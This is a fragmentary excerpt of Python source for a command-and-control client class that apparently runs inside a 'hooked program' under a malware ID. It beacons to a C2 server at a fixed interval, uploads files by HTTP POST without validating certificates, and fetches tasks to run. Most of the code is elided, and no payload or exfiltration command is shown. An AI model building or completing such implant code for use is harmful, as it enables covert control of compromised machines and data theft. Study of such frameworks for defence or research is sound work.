...
# Define the constant: 
DFT_RPT_INV = 10    # default report C2 server time interval(sec)
...
class c2Client(threading.Thread):
    """ The C2 client will start a parallel thread with the hooked program's 
        ...
        for the https comm, the program will not verify the cert's validation.)
    """
    def __init__(self, malwareID, c2Ipaddr, c2Port=5000, ownIP='127.0.0.1',
        ...
        #    'taskID'   : 0,
        #    'taskType' : None, 
        #    'startT'   : None,  # None means start immediately if received 
        ...
        # task will wait until upload finished. Even our C2 is Multi-threading, we want 
        # to reduce the load of C2 during transfer files.
        ...
        """ Send HTTP POST request to send data.
            Args:
                ...
                postfile (bool, optional): True: upload file, False: submit data/message.
                    Defaults to False.
            Returns:
                _type_: Server response or None if post failed / lose connection.
        """
        self.reportLock.acquire()
        try:
    ...
    def fetchTaskFromC2(self):
        ...
        if self.c2Connected:
            ...
            if 'task' in res.keys():
                ...
                print('Invalid task information: %s', str(res.keys()))
                return False
        else:
